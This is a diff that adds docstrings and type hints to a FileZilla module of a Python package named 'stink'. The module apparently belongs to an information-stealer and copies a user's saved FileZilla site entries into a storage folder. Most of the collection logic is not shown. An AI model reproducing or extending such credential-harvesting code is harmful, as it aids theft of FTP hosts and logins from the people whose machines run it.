@@ -6,7 +6,9 @@ from stink.helpers.config import FileZillaConfig
 
 
 class FileZilla:
-
+    """
+    Collects hosts from the FileZilla.
+    """
     def __init__(self, storage_path: str, folder: str, errors: bool):
 
         self.__storage_path = storage_path
@@ -15,15 +17,21 @@ class FileZilla:
 
         self.__config = FileZillaConfig()
 
-    def __create_folder(self):
-
+    def __create_folder(self) -> None:
+        """
+        Creates storage for the FileZilla module.
+        :return: None
+        """
         folder = rf"{self.__storage_path}\{self.__folder}"
 
         if not path.exists(folder):
             makedirs(folder)
 
-    def __get_sites(self):
-
+    def __get_sites(self) -> None:
+        """
+        Collects all FileZilla hosts.
+        :return: None
+        """
         if not path.exists(self.__config.SitesPath):
             return
 
@@ -61,11 +69,14 @@ class FileZilla:
 
         file_zilla.close()
 
-    def run(self):
-
+    def run(self) -> None:
+        """
+        Launches the FileZilla hosts collection module.
+        :return: None
+        """
         try:
 
             self.__get_sites()
 
         except Exception as e:
-            if self.__errors is True: print(f"[FilleZilla]: {repr(e)}")
+            if self.__errors is True: print(f"[FileZilla]: {repr(e)}")
